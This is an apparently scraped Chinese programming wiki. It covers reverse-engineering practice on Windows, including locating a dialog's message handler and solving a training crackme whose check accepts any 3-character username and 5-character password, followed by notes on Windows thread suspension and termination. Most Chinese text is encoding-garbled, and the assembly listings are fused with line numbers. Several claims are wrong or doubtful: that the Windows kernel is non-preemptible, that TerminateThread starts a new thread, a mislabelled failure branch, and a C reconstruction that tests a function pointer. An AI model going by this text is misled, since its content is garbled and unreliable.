ç”¨æˆ·æ“ä½œè§¦å‘çš„åŸå§‹æ¶ˆæ¯å…ˆç”±ç³»ç»Ÿçš„å›è°ƒå‡½æ•°å¤„ç†=&gt;ä¸Šé¢æ­¥éª¤1åœ¨å­çª—å£çš„ç³»ç»Ÿå›è°ƒå‡½æ•°ä¸Šä¸‹çš„æ¶ˆæ¯ç±»å‹æ˜¯è¯¸å¦‚201 WM_LBUTTONDOWNï¼Œ202 WM_LBUTTONUPç­‰åŸå§‹æ¶ˆæ¯ï¼Œè€Œä¸æ˜¯WM_COMMANDæ¶ˆæ¯ åœ¨ç³»ç»Ÿçš„å›è°ƒå‡½æ•°ä¸­ä¼šè°ƒç”¨3ç¯ç”¨æˆ·ç¼–å†™çš„æ¶ˆæ¯å¤„ç†å‡½æ•°=&gt;åœ¨PEä»£ç æ®µä¸‹å†…å­˜è®¿é—®æ–­ç‚¹ï¼ŒF9è·‘èµ·æ¥ï¼Œç­‰ç¨‹åºå›åˆ°3ç¯çš„æ¶ˆæ¯å¤„ç†å‡½æ•° ä¸ºä»€ä¹ˆå›åˆ°3ç¯æ¶ˆæ¯å¤„ç†å‡½æ•°æ—¶ï¼Œå¯èƒ½ä¸æ˜¯è‡ªå·±æƒ³è¦çš„WM_COMMANDç±»å‹è€Œæ˜¯å…¶ä»–ç±»å‹ï¼ŒåŸå› ç›®å‰ç¬”è€…æƒ³åˆ°ä¸¤ä¸ªï¼š ç®€å•ç‚¹åœ°ç†è§£æ˜¯ï¼Œæ¶ˆæ¯æ˜¯åœ¨ä¸æ–­äº§ç”Ÿçš„ï¼Œæ¶ˆæ¯å¤„ç†æ—¶é¡ºåºè¿›è¡Œçš„ï¼Œåœ¨å¤„ç†æˆ‘ä»¬é¼ æ ‡æ¾å¼€è¿™ä¸ªæ¶ˆæ¯å‰éœ€è¦å¤„ç†é˜Ÿåˆ—ä¸­å‰é¢çš„å…¶ä»–æ¶ˆæ¯ã€‚æ‰€ä»¥ç³»ç»Ÿå…ˆå¤„ç†å…¶ä»–æ¶ˆæ¯ï¼Œå›åˆ°3ç¯ï¼Œ3ç¯å®Œäº†ï¼Œå›åˆ°ç³»ç»Ÿå›è°ƒå‡½æ•°ï¼Œå†F9ï¼Œè¿™æ¬¡å‘ç»™3ç¯çš„æ¶ˆæ¯å¤„ç†å‡½æ•°æ‰å¯èƒ½æ˜¯è‡ªå·±æƒ³è¦çš„WM_COMMMANDç±»å‹ æ·±åˆ»çš„ç†è§£ç›®å‰èƒ½æ‰¾åˆ°çš„å¯èƒ½çš„å‚è€ƒèµ„æ–™æ˜¯ã€ŠWindowså†…æ ¸æƒ…æ™¯åˆ†æã€‹7.1ï¼Œ7.2èŠ‚ï¼Œè¦çœ‹å…·ä½“çš„æ¶ˆæ¯å¤„ç†æœºåˆ¶ç»†èŠ‚ã€‚ åŸå§‹è‰ç¨¿ï¼šæ–­åœ¨ç³»ç»Ÿæ¶ˆæ¯å¤„ç†å‡½æ•°åï¼Œåœ¨ä»£ç æ®µä¸‹å†…å­˜è®¿é—®æ–­ç‚¹ï¼ŒF9ï¼Œåœåœ¨3ç¯çš„æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼Œé€šè¿‡å †æ ˆçœ‹åˆ°å¯èƒ½ä¸æ˜¯è‡ªå·±æƒ³è¦çš„æ¶ˆæ¯ç±»å‹ F8ï¼ŒF8ï¼Œå•æ­¥å›ç³»ç»Ÿçš„æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼ˆæ­¤æ—¶å†…å­˜è®¿é—®æ–­ç‚¹è¿˜åœ¨ï¼‰ï¼ŒF9è·‘ï¼Œå›åˆ°3ç¯çš„æ¶ˆæ¯å¤„ç†å‡½æ•° ç»ƒä¹  ç‚¹å‡»çª—å£ä¸Šä¸‰ä¸ªæŒ‰é’®ä¼šå¼¹çª—ï¼Œå¼¹çª—å‰ç¨‹åºåˆ†åˆ«åšäº†ä»€ä¹ˆäº‹ï¼ˆReverseTraining_3.exeï¼‰ è¿‡ç¨‹å®šä½åˆ°æ¶ˆæ¯å¤„ç†å‡½æ•°åï¼Œæ²¡å•¥èƒ½åˆ†æçš„ã€‚å°±åªæœ‰Messagebox3E8ï¼Œ3E9ï¼Œ3EAåˆ†åˆ«æ˜¯ä¸‰ä¸ªæŒ‰é’®çš„IDå·Messagboxåé¢ä¸¤è¡Œå…³äºeaxå’Œesiçš„æ“ä½œä¼°è®¡æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„ï¼Œè€Œä¸æ˜¯ç¨‹åºå‘˜å†™çš„ç¼–è¯‘å™¨ç”Ÿæˆçš„ã€‚çœ‹åˆ°è¿™ä¸ªæ¶ˆæ¯å¤„ç†å‡½æ•°å‰é¢pushäº†esiï¼Œæ‰€ä»¥åé¢retnå‰pop esiå¹³è¡¡å †æ ˆï¼Œç„¶åè¿”å›åˆ°è°ƒç”¨è€…ã€‚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656600401000 &gt; . 8B4424 08 mov eax, dword ptr ss:[esp+8]00401004 . 56 push esi00401005 . 83F8 10 cmp eax, 10 ; Switch (cases 10..201)00401008 . BE 01000000 mov esi, 10040100D . 0F84 A4000000 je 004010B7 ; 004010B700401013 . 3D 11010000 cmp eax, 11100401018 . 74 2A je short 00401044 ; 004010440040101A . 3D 01020000 cmp eax, 2010040101F . 74 06 je short 00401027 ; 0040102700401021 . 33C0 xor eax, eax ; Default case of switch 0040100500401023 . 5E pop esi00401024 . C2 1000 retn 1000401027 &gt; 8B4424 08 mov eax, dword ptr ss:[esp+8] ; Case 201 (WM_LBUTTONDOWN) of switch 004010050040102B . 6A 00 push 0 ; /Style = MB_OK|MB_APPLMODAL0040102D . 68 60604000 push 406060 ; |Title = &quot;Demo&quot;00401032 . 68 54604000 push 406054 ; |Text = &quot;Hello &quot;,B4,&quot;&quot;,B0,&quot;å£!&quot;00401037 . 50 push eax ; |hOwner00401038 . FF15 A0504000 call near dword ptr ds:[4050A0] ; \\MessageBoxA0040103E . 8BC6 mov eax, esi00401040 . 5E pop esi00401041 . C2 1000 retn 1000401044 &gt; 8B4424 10 mov eax, dword ptr ss:[esp+10] ; Case 111 (WM_COMMAND) of switch 0040100500401048 . 25 FFFF0000 and eax, 0FFFF0040104D . 2D E8030000 sub eax, 3E8 ; Switch (cases 3E8..3EA)00401052 . 74 46 je short 0040109A ; 0040109A00401054 . 48 dec eax00401055 . 74 26 je short 0040107D ; 0040107D00401057 . 48 dec eax00401058 . 74 06 je short 00401060 ; 004010600040105A . 33C0 xor eax, eax ; Default case of switch 0040104D0040105C . 5E pop esi0040105D . C2 1000 retn 1000401060 &gt; 8B4C24 08 mov ecx, dword ptr ss:[esp+8] ; Case 3EA of switch 0040104D00401064 . 6A 00 push 0 ; /Style = MB_OK|MB_APPLMODAL00401066 . 68 60604000 push 406060 ; |Title = &quot;Demo&quot;0040106B . 68 48604000 push 406048 ; |Text = &quot;Button 3&quot;00401070 . 51 push ecx ; |hOwner00401071 . FF15 A0504000 call near dword ptr ds:[4050A0] ; \\MessageBoxA00401077 . 8BC6 mov eax, esi00401079 . 5E pop esi0040107A . C2 1000 retn 100040107D &gt; 8B5424 08 mov edx, dword ptr ss:[esp+8] ; Case 3E9 of switch 0040104D00401081 . 6A 00 push 0 ; /Style = MB_OK|MB_APPLMODAL00401083 . 68 60604000 push 406060 ; |Title = &quot;Demo&quot;00401088 . 68 3C604000 push 40603C ; |Text = &quot;Button 2&quot;0040108D . 52 push edx ; |hOwner0040108E . FF15 A0504000 call near dword ptr ds:[4050A0] ; \\MessageBoxA00401094 . 8BC6 mov eax, esi00401096 . 5E pop esi00401097 . C2 1000 retn 100040109A &gt; 8B4424 08 mov eax, dword ptr ss:[esp+8] ; Case 3E8 of switch 0040104D0040109E . 6A 00 push 0 ; /Style = MB_OK|MB_APPLMODAL004010A0 . 68 60604000 push 406060 ; |Title = &quot;Demo&quot;004010A5 . 68 30604000 push 406030 ; |Text = &quot;Button 1&quot;004010AA . 50 push eax ; |hOwner004010AB . FF15 A0504000 call near dword ptr ds:[4050A0] ; \\MessageBoxA004010B1 . 8BC6 mov eax, esi004010B3 . 5E pop esi004010B4 . C2 1000 retn 10004010B7 &gt; 8B4C24 08 mov ecx, dword ptr ss:[esp+8] ; Case 10 (WM_CLOSE) of switch 00401005004010BB . 6A 00 push 0 ; /Result = 0004010BD . 51 push ecx ; |hWnd004010BE . FF15 A4504000 call near dword ptr ds:[4050A4] ; \\EndDialog004010C4 . 8BC6 mov eax, esi004010C6 . 5E pop esi004010C7 . C2 1000 retn 10 è´¦æˆ·åå’Œå¯†ç è¾“å…¥ä»€ä¹ˆæ‰ä¼šå‡ºç°æ­å–œçš„å¼¹çª—ï¼ˆReverseTraining_4.exeï¼‰ ç­”æ¡ˆæ ¹æ®00401000å‡½æ•°çš„è¿”å›å€¼æ¥å¼¹æ­å–œæˆ–Errorçš„MessageBoxè¿”å›å€¼ä¸º1ï¼Œæ­å–œè¿”å›å€¼ä¸º0ï¼ŒErrorè¿™ä¸ªå‡½æ•°é‡Œç”¨äº†ä¸¤ä¸ªç¼“å†²åŒºåˆ†åˆ«æ¥æ”¶ç¼–è¾‘æ¡†é‡Œçš„å†…å®¹ï¼Œéšåç»Ÿè®¡å­—ç¬¦ä¸ªæ•°ã€‚åªæœ‰å½“è´¦æˆ·ç¼–è¾‘æ¡†è¾“å…¥å­—ç¬¦ä¸ªæ•°ä¸º3ï¼Œå¯†ç ç¼–è¾‘æ¡†è¾“å…¥å­—ç¬¦ä¸ªæ•°ä¸º5æ—¶ï¼Œå‡½æ•°è¿”å›1ã€‚ç»Ÿè®¡ç¼“å†²åŒºä¸­å­—ç¬¦ä¸ªæ•°ç”¨çš„æ˜¯repne scasbæ±‡ç¼–æŒ‡ä»¤ã€‚ã€Šé»‘çš®ä¹¦æ±‡ç¼–è¯­è¨€4thã€‹æ±‡ç¼–ä»£ç åŠä»£ç è¿˜åŸç¤ºæ„123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585900401000 /$ 81EC A0000000 sub esp, 0A0 ; æŠ¬æ ˆA0hï¼Œ160d00401006 |. B9 14000000 mov ecx, 14 ; 14hæ¬¡ï¼Œ20æ¬¡0040100B |. 33C0 xor eax, eax ; eax=00040100D |. 53 push ebx ; ä¿æŠ¤ç°åœºï¼Œretå‰è¿˜åŸ0040100E |. 56 push esi ; ä¿æŠ¤ç°åœºï¼Œretå‰è¿˜åŸ0040100F |. 8BB424 AC0000&gt;mov esi, dword ptr ss:[esp+AC] ; esi&lt;-hwndDlg00401016 |. 57 push edi ; ä¿æŠ¤ç°åœºï¼Œretå‰è¿˜åŸ00401017 |. 8D7C24 0C lea edi, dword ptr ss:[esp+C]0040101B |. 68 E8030000 push 3E8 ; /ControlID = 3E8 (1000.)00401020 |. F3:AB rep stos dword ptr es:[edi] ; |00401022 |. B9 14000000 mov ecx, 14 ; |00401027 |. 8D7C24 60 lea edi, dword ptr ss:[esp+60] ; |0040102B |. F3:AB rep stos dword ptr es:[edi] ; |0040102D |. 8B3D A8504000 mov edi, dword ptr ds:[4050A8] ; |USER32.GetDlgItem00401033 |. 56 push esi ; |hWnd00401034 |. FFD7 call near edi ; \\GetDlgItem00401036 |. 68 E9030000 push 3E9 ; /ControlID = 3E9 (1001.)0040103B |. 56 push esi ; |hWnd0040103C |. 8BD8 mov ebx, eax ; |0040103E |. FFD7 call near edi ; \\GetDlgItem00401040 |. 8B3D AC504000 mov edi, dword ptr ds:[4050AC] ; USER32.GetWindowTextA00401046 |. 8BF0 mov esi, eax00401048 |. 8D4424 0C lea eax, dword ptr ss:[esp+C] ; szUserBuffer0040104C |. 6A 50 push 50 ; /Count = 50 (80.)0040104E |. 50 push eax ; |Buffer0040104F |. 53 push ebx ; |hWnd00401050 |. FFD7 call near edi ; \\GetWindowTextA00401052 |. 8D4C24 5C lea ecx, dword ptr ss:[esp+5C] ; szPassBuffer00401056 |. 6A 50 push 50 ; /Count = 50 (80.)00401058 |. 51 push ecx ; |Buffer00401059 |. 56 push esi ; |hWnd0040105A |. FFD7 call near edi ; \\GetWindowTextA0040105C |. 8D7C24 0C lea edi, dword ptr ss:[esp+C] ; szUserBuffer00401060 |. 83C9 FF or ecx, FFFFFFFF00401063 |. 33C0 xor eax, eax00401065 |. F2:AE repne scas byte ptr es:[edi] ; ç»Ÿè®¡szUserBufferä¸­æœ‰å‡ ä¸ªå­—ç¬¦00401067 |. F7D1 not ecx00401069 |. 49 dec ecx0040106A |. 83F9 03 cmp ecx, 3 ; ä¸ªæ•°ä¸æ˜¯3ï¼Œé€€å‡ºç¨‹åº0040106D |. 75 20 jnz short 0040108F ; 0040108F0040106F |. 8D7C24 5C lea edi, dword ptr ss:[esp+5C]00401073 |. 83C9 FF or ecx, FFFFFFFF00401076 |. F2:AE repne scas byte ptr es:[edi] ; ç»Ÿè®¡szPassBufferä¸­æœ‰å‡ ä¸ªå­—ç¬¦00401078 |. F7D1 not ecx0040107A |. 49 dec ecx0040107B |. 83F9 05 cmp ecx, 5 ; ä¸ªæ•°ä¸æ˜¯5ï¼Œé€€å‡ºç¨‹åº0040107E |. 75 0F jnz short 0040108F ; 0040108F00401080 |. 5F pop edi00401081 |. 5E pop esi00401082 |. B8 01000000 mov eax, 100401087 |. 5B pop ebx00401088 |. 81C4 A0000000 add esp, 0A00040108E |. C3 retn0040108F |&gt; 5F pop edi00401090 |. 5E pop esi00401091 |. 33C0 xor eax, eax ; æ­£ç¡®ï¼Œè¿”å›å€¼ä¸º000401093 |. 5B pop ebx00401094 |. 81C4 A0000000 add esp, 0A00040109A \\. C3 retnè‰ç¨¿1234567891011121314151617181920212223241ä¸ªå‚æ•°ï¼š\tediï¼š721630ï¼ˆhwndDlgï¼‰STOSï¼š\tSTOS DWORD PTR ES:[EDI]ï¼Œå°†eaxçš„å†…å®¹ä¿å­˜åˆ°EDIå¯»å€çš„èŒä½\tDF=0ï¼Œæ–¹å‘ï¼šä½åœ°å€-&gt;é«˜åœ°å€ï¼Œ20ä¸ªDWORDå¡«å……ä¸º0\t010B173E=GetDlgItem\t00091776=GetDlgItem0019F6BC-0019F70C,szBuffer[50]=0;0019F70C-?,szBuffer2[50]=0;REPNE SCAS BYTE PTR ES:[EDI] // å½“ECX!=0å¹¶ä¸”ZF==0æ—¶ é‡å¤æ‰§è¡Œåè¾¹çš„æŒ‡ä»¤ æ¯æ‰§è¡Œä¸€æ¬¡ECXçš„å€¼å‡1SCASBå°†ALä¸­çš„å€¼ä¸EDIå¯»å€çš„ä¸€ä¸ªå­—èŠ‚è¿›è¡Œæ¯”è¾ƒREPNEï¼ˆno equalï¼‰repne scaså½“ecx&gt;0ä¸”ALçš„å€¼ä¸ç­‰äºå†…å­˜ä¸­æ¯ä¸ªè¿ç»­çš„å€¼ï¼Œä¸ç›¸ç­‰åˆ™é‡å¤ecx=FFFFFFFF,ecx-1ï¼ŒFFFFFFFCï¼Œå–åï¼Œå°±æ˜¯3ä¸ªè´¦å·ä¸ªæ•°ä¸º3ï¼Œå¯†ç ä¸º5Cè¯­è¨€å¤§è‡´çš„é€»è¾‘ç¤ºæ„123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//æ£€æŸ¥è¾“å…¥çš„å‡½æ•°int CheckCredentials(HWND hwnd)&#123; char szUserBuffer[0x50] = 0; char szPassBuffer[0x50] = 0; //1ã€è·å–æ–‡æœ¬æ¡†å¥æŸ„ hEditUser = GetDlgItem(hwnd, 0x3E8); //è·å–è´¦å·å³è¾¹ç¼–è¾‘æ–‡æœ¬æ¡†çš„å¥æŸ„ hEditPassword = GetDlgItem(hwnd, 0x3E9); //è·å–å¯†ç å³è¾¹ç¼–è¾‘æ–‡æœ¬æ¡†çš„å¥æŸ„ //2ã€è·å–ç¼–è¾‘æ¡†é‡Œçš„å†…å®¹ GetWindowTextA(hEditUser, szUserBuffer, 0x50); GetWindowTextA(hEditPassword, szPassBuffer, 0x50); if (strlen(szUserBuffer) == 3 &amp;&amp; strlen(szPassBuffer) == 5) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; HWND hEditUser = NULL; HWND hEditPassword = NULL; switch (uMsg) &#123; //å…¶ä»–æ¶ˆæ¯ç±»å‹ç•¥ case WM_COMMAND: switch (LOWORD(wParam)) &#123; case 0x3EA: //ç™»å½•æŒ‰é’® if (CheckCredentials) &#123; MessageBox(hwndDlg, &quot;æ­å–œ&quot;, &quot;OK&quot;, MB_OK | MB_APPLMODAL); &#125; else &#123; MessageBox(hwndDlg, &quot;ERROR!&quot;, &quot;Error&quot;, MB_OK | MB_APPLMODAL); &#125; return TRUE; &#125; break; &#125; return FALSE;&#125;"},{"title":"æ§åˆ¶çº¿ç¨‹","path":"/wiki/Windows_API/æ§åˆ¶çº¿ç¨‹.html","content":"æŒ‚èµ·å’Œæ¢å¤ æŒ‚èµ·å‡ æ¬¡å°±è¦æ¢å¤å‡ æ¬¡ï¼Œsuspend countä¸ä¸º0è¿™ä¸ªçº¿ç¨‹ä»æŒ‚èµ· Each thread has a suspend count (with a maximum value of MAXIMUM_SUSPEND_COUNT). If the suspend count is greater than zero, the thread is suspended; otherwise, the thread is not suspended and is eligible for execution. Calling SuspendThread causes the target threadâ€™s suspend count to be incremented. The ResumeThread function decrements the suspend count of a suspended thread. SuspendThread Suspends the specified thread. 123DWORD SuspendThread( [in] HANDLE hThread); hThreadï¼šA handle to the thread that is to be suspended. The handle must have the THREAD_SUSPEND_RESUME access right. ResumeThread Decrements a threadâ€™s suspend count. When the suspend count is decremented to zero, the execution of the thread is resumed. 123DWORD ResumeThread( [in] HANDLE hThread); hThreadï¼šA handle to the thread to be restarted. This handle must have the THREAD_SUSPEND_RESUME access right. å³ä½¿çº¿ç¨‹çš„æŒ‚èµ·è®¡æ•°å™¨ï¼ˆsuspend countï¼‰å‡ä¸º0åï¼Œçº¿ç¨‹ä¹Ÿä¸æ˜¯ç«‹å³æ¢å¤æ‰§è¡Œï¼Œè¦çœ‹è°ƒåº¦ç¨‹åºæ˜¯å¦ç»™è¿™ä¸ªçº¿ç¨‹åˆ†CPUæ—¶é—´ã€‚ Windowsæ“ä½œç³»ç»Ÿçš„å†…æ ¸æ˜¯ä¸å¯æŠ¢å çš„ï¼Œå³åœ¨æ‰§è¡Œå†…æ ¸ä»£ç æ—¶ï¼Œä¸èƒ½è¢«ä¸­æ–­ã€‚å®ƒä¸æ˜¯ä¸€ä¸ªå®æ—¶æ“ä½œç³»ç»Ÿ(RTOS)ï¼Œæ— æ³•ä¿è¯çº¿ç¨‹åœ¨ResumeThreadè¢«è°ƒç”¨åç«‹å³è·å¾—CPUæ—¶é—´ã€‚å› æ­¤ï¼Œä¸è¦æŠ±æœ‰èƒ½ç²¾ç¡®æ§åˆ¶çº¿ç¨‹æ‰§è¡Œæ—¶é—´ç‚¹çš„è¿™ç§æœŸæœ›ã€‚ ä¸å¯æŠ¢å çš„ã€éå®æ—¶æ“ä½œç³»ç»Ÿé€šå¸¸åœ¨æ‰§è¡Œå†…æ ¸åŠŸèƒ½æ—¶æ˜¯ä¸å¯ä¸­æ–­çš„ã€‚ ç»ˆæ­¢çº¿ç¨‹ æœ‰ä¸‰ç§æ–¹å¼å¯ä»¥ç»ˆæ­¢çº¿ç¨‹ï¼š çº¿ç¨‹å‡½æ•°é‡Œreturnï¼Œå‡½æ•°ç»“æŸæ‰§è¡Œ ä½¿ç”¨ExitThreadå‡½æ•° ä½¿ç”¨TerminateThreadå‡½æ•° é€€å‡ºç ç”¨äºè®©ç¨‹åºå…¶ä»–åœ°æ–¹çŸ¥é“è¯¥çº¿ç¨‹å› ä»€ä¹ˆåŸå› é€€å‡ºï¼Œæ˜¯æ­£å¸¸ç»“æŸï¼Œè¿˜æ˜¯å…¶ä»–åŸå› ç»“æŸã€‚é€€å‡ºç æ¥æºï¼š çº¿ç¨‹å‡½æ•°ä¸­returnçš„å€¼ ExitThreadä¼ å‚ç»™çš„é€€å‡ºç  TerminateThreadä¼ å‚ç»™çš„é€€å‡ºç  é€€å‡ºç èƒ½åœ¨IDEçš„è¾“å‡ºçª—å£ä¸­çœ‹åˆ°ï¼šçº¿ç¨‹xxxå·²é€€å‡ºï¼Œè¿”å›å€¼ä¸ºxxï¼ˆè¿™ä¸ªå°±æ˜¯é€€å‡ºç ï¼‰ çº¿ç¨‹å‡½æ•°é‡Œreturn çº¿ç¨‹å‡½æ•°ç»“æŸè°ƒç”¨ã€‚returnè¿”å›çš„å€¼å³ä¸ºé€€å‡ºç  123456DWORD WINAPI ThreadProc(LPVOID lpParam) &#123;\t//... return 0; //å‡½æ•°è°ƒç”¨ç»“æŸï¼Œreturnçš„å€¼æ˜¯é€€å‡ºç &#125; ExitThread ExitThreadæ˜¯åœ¨çº¿ç¨‹å‡½æ•°å†…éƒ¨ä¸­è°ƒç”¨ã€‚ 123void ExitThread( [in] DWORD dwExitCode); å¸¸è§çš„ç”¨æ³•ï¼Œåœ¨çº¿ç¨‹å‡½æ•°å¤–ç”¨ä¸€ä¸ªæ ‡å¿—ï¼ˆFlagï¼‰æ¥æ§åˆ¶è¿™ä¸ªçº¿ç¨‹æ˜¯å¦åœæ­¢ã€‚ ä¾‹1234567891011121314151617181920BOOL bFlag=FALSE; //æ§åˆ¶çº¿ç¨‹æ˜¯å¦é€€å‡ºDWORD WINAPI ThreadProc(LPVOID lpParam) &#123;\t//... while()\t&#123; //...æ‰§è¡ŒåŠŸèƒ½ if(bFlag) //æ ¹æ®å¤–éƒ¨Flagçš„çŠ¶æ€é€‰æ‹©æ˜¯å¦é€€å‡ºçº¿ç¨‹ &#123; ::ExitThread(1); //ä¼ é€’é€€å‡ºç  &#125;\t&#125; //... return 0;&#125; TerminateThread TerminateThreadåœ¨çº¿ç¨‹å‡½æ•°å¤–éƒ¨è°ƒç”¨ã€‚TerminateThreadæ˜¯å‘Šè¯‰æ“ä½œç³»ç»Ÿè¯´æˆ‘è¦ç»“æŸè¿™ä¸ªçº¿ç¨‹ï¼ˆå¼‚æ­¥è°ƒç”¨ï¼‰ã€‚ 1234BOOL TerminateThread( [in, out] HANDLE hThread, [in] DWORD dwExitCode); ç¤ºä¾‹123HANDLE hThread = CreateThread(...);TerminateThread(hThread, 3); ExitThread VS TerminateThread æ˜¯å¦æ¸…ç†å †æ ˆ è°ƒç”¨æ–¹å¼ ExitThread æ¸…ç† åŒæ­¥è°ƒç”¨ TerminateThread ä¸æ¸…ç† å¼‚æ­¥è°ƒç”¨ æ˜¯å¦æ¸…ç†çº¿ç¨‹çš„å †æ ˆ ExitThreadï¼šä¼šå°†çº¿ç¨‹ä½¿ç”¨åˆ°çš„å †æ ˆé‡Šæ”¾æ‰ï¼ˆçº¿ç¨‹å¼€å§‹è¿è¡Œæ—¶ç”¨åˆ°çš„å †æ ˆä¸­çš„æ‰€æœ‰å†…å®¹ï¼‰ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´èµ„æºæ³„éœ²ï¼Œå› ä¸ºåœ¨çº¿ç¨‹å‡½æ•°ä¸­ç”³è¯·çš„èµ„æºå¯èƒ½æ²¡æœ‰æœºä¼šé‡Šæ”¾ã€‚å‡å¦‚åœ¨çº¿ç¨‹å‡½æ•°ä¸­ç”³è¯·äº†èµ„æºï¼Œæ‰§è¡ŒExitThreadåï¼Œç”³è¯·çš„é‚£äº›èµ„æºå°±æ²¡æœºä¼šåšé‡Šæ”¾äº†ã€‚ å› æ­¤æ¨èè®©çº¿ç¨‹å‡½æ•°æ­£å¸¸ç»“æŸè°ƒç”¨ï¼Œæ­£å¸¸è¿”å›ï¼Œè‡ªå·±å°±èƒ½åœ¨å‡½æ•°ç»“æŸå‰å°†èµ„æºé‡Šæ”¾æ‰ã€‚ ç¤ºä¾‹ ä¾‹1ä¾‹2ä¾‹1ï¼šåœ¨çº¿ç¨‹å‡½æ•°ä¸­å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼ŒExitThreadåè¿™ä¸ªå¯¹è±¡çš„ææ„ä¸ä¼šè¢«è°ƒç”¨ã€‚12345678910111213141516171819202122232425262728293031323334353637#include &lt;windows.h&gt;#include &lt;iostream&gt;class MyClass &#123;public: MyClass() &#123; std::cout &lt;&lt; &quot;MyClass Constructor&quot; &lt;&lt; std::endl; &#125; ~MyClass() &#123; std::cout &lt;&lt; &quot;MyClass Destructor&quot; &lt;&lt; std::endl; &#125;&#125;;DWORD WINAPI ThreadProc(LPVOID lpParam)&#123; MyClass obj; // åˆ›å»ºå¯¹è±¡ // æ‰§è¡Œä¸€äº›æ“ä½œ std::cout &lt;&lt; &quot;Thread running...&quot; &lt;&lt; std::endl; // ä½¿ç”¨ ExitThread ç»ˆæ­¢çº¿ç¨‹ ExitThread(1); // ç”±äº ExitThread çš„è°ƒç”¨ï¼Œä¸‹é¢çš„ä»£ç ä¸ä¼šè¢«æ‰§è¡Œ // å¹¶ä¸” MyClass çš„ææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ return 0; // è¿™è¡Œä»£ç æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œ&#125;int main()&#123; HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); return 0;&#125;ä¾‹2ï¼šåœ¨çº¿ç¨‹å‡½æ•°ä¸­åŠ¨æ€åˆ†é…ä¸€å—å†…å­˜ã€‚ExitThreadåè¿™å—å†…å­˜ä¸ä¼šè¢«é‡Šæ”¾ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ã€‚12345678910111213141516171819202122232425262728#include &lt;windows.h&gt;#include &lt;iostream&gt;DWORD WINAPI ThreadProc(LPVOID lpParam)&#123; int* p = new int(5); // åŠ¨æ€åˆ†é…å†…å­˜å¹¶åˆå§‹åŒ–ä¸º5 // æ‰§è¡Œä¸€äº›æ“ä½œ std::cout &lt;&lt; &quot;Thread running...&quot; &lt;&lt; std::endl; // ä½¿ç”¨ ExitThread ç»ˆæ­¢çº¿ç¨‹ ExitThread(1); // ç”±äº ExitThread çš„è°ƒç”¨ï¼Œä¸‹é¢çš„ä»£ç ä¸ä¼šè¢«æ‰§è¡Œ // å¹¶ä¸”åŠ¨æ€åˆ†é…çš„å†…å­˜ä¸ä¼šè¢«é‡Šæ”¾ delete p; // è¿™è¡Œä»£ç æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œ return 0; // è¿™è¡Œä»£ç æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œ&#125;int main()&#123; HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); return 0;&#125; TerminateThreadï¼šä¸ä¼šæ¸…ç†å †æ ˆã€‚å¾®è½¯å°±æ˜¯è¿™ä¹ˆè®¾è®¡çš„ï¼Œè€ƒè™‘è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼Œå¦‚æœå°†ä¸€ä¸ªçº¿ç¨‹çš„å †æ ˆæ¸…ç†äº†ï¼Œå‡è®¾è¿˜æœ‰å…¶ä»–çº¿ç¨‹åœ¨ä½¿ç”¨è¿™ä¸ªå †æ ˆä¸­çš„å€¼ï¼Œé‚£å°±ä¼šå‡ºé”™ï¼Œè¿™ç§é”™è¯¯é€šå¸¸éš¾ä»¥è°ƒè¯•ã€‚ï¼ˆå› ä¸ºTerminateThreadæ˜¯ä»å¤–éƒ¨ç»ˆæ­¢çº¿ç¨‹ï¼Œè€Œä¸æ˜¯çº¿ç¨‹è‡ªè¡Œç»ˆæ­¢ï¼Œæ‰€ä»¥åœ¨è®¾è®¡ä¸Šä¸é‡Šæ”¾çº¿ç¨‹çš„å †æ ˆï¼‰ åŒæ­¥è°ƒç”¨å’Œå¼‚æ­¥è°ƒç”¨ ExitThreadæ˜¯åŒæ­¥è°ƒç”¨ï¼ŒTerminateThreadæ˜¯å¼‚æ­¥è°ƒç”¨ã€‚ ExitThreadï¼šåŒæ­¥è°ƒç”¨ ç¨‹åºæ‰§è¡Œåˆ°Bæ—¶ï¼Œè¯´æ˜ExitThreadä¸€å®šæ˜¯æ‰§è¡Œå®Œäº†çš„ï¼Œå³çº¿ç¨‹å·²ç»ç»“æŸäº† 12345//... AExitThread(); //ç»“æŸçº¿ç¨‹//... Bï¼ˆæ­¤æ—¶ExitThreadå·²æ‰§è¡Œå®Œæ¯•ï¼‰ TerminateThreadï¼šå¼‚æ­¥è°ƒç”¨ ç¨‹åºæ‰§è¡Œåˆ°Bæ—¶ï¼ŒTerminateThreadä¸ä¸€å®šæ‰§è¡Œå®Œæ¯•ï¼Œå³ä¸ç¡®å®šçº¿ç¨‹æ˜¯å¦å·²ç»ç»“æŸã€‚å› ä¸ºTerminateThreadæ˜¯å¼‚æ­¥è°ƒç”¨ï¼Œå®ƒä¼šæ–°èµ·ä¸€ä¸ªçº¿ç¨‹å»ç»ˆæ­¢ç›®æ ‡çº¿ç¨‹ï¼Œè€Œæˆ‘ä»¬çš„ä»£ç åœ¨è°ƒç”¨TerminateThreadåä¼šç«‹å³ç»§ç»­æ‰§è¡Œåˆ°Bã€‚ å°±æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œè§¦å‘äº†ä¸€ä¸ªå¹¶è¡Œçš„åˆ†æ”¯ï¼Œå½“å‰åˆ†æ”¯ä¸çŸ¥é“å¦å¤–ä¸€ä¸ªåˆ†æ”¯æ˜¯å¦æ‰§è¡Œå®Œæ¯• 12345//... 